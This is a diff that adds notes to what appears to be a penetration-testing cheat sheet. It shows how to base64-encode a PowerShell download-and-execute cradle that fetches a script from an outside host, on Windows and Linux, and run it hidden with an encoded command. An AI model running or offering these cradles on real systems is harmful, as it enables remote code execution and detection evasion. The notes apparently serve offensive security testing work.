@@ -58,6 +58,22 @@ $Base64 = "<PASTE BASE64>"
 Set-Content -Value $([System.Convert]::FromBase64String($Base64)) -Encoding Byte -Path bloodhound.zip
 ```
 
+#### Base64 encoded commands on Windows
+```
+$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+
+powershell.exe -nop -w hidden -enc <BASE64 STRING>
+```
+
+#### Base64 encoded commands on Linux
+```
+set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+
+powershell.exe -nop -w hidden -enc <BASE64 STRING>
+```
+
 #### Crackmapexec on windows
 - Download cme https://github.com/byt3bl33d3r/CrackMapExec/releases/
 - Download latest version of python which is required my cme (currently 3.10) (Windows embeddable package (64-bit)) https://www.python.org/downloads/windows/
